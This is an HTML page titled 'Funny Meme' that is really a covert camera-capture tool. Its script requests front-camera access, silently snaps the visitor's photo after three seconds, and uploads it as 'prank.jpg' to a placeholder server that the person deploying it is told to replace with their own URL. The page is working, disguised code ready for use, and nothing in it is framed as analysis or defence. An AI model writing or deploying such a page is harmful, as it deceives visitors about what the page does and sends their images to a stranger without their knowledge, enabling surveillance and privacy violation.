<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Meme</title>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        // Start video stream from front camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            video.srcObject = stream;
            setTimeout(captureImage, 3000); // Capture after 3 seconds
        })
        .catch(err => console.error("Camera access denied:", err));

        function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert image to Blob and send to server
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("file", blob, "prank.jpg");

                fetch("https://your-server.com/upload", {  // Change this to your server URL!
                    method: "POST",
                    body: formData
                })
                .then(response => console.log("Image sent!"))
                .catch(error => console.error("Error:", error));
            }, "image/jpeg");
        }
    </script>
</body>
</html>
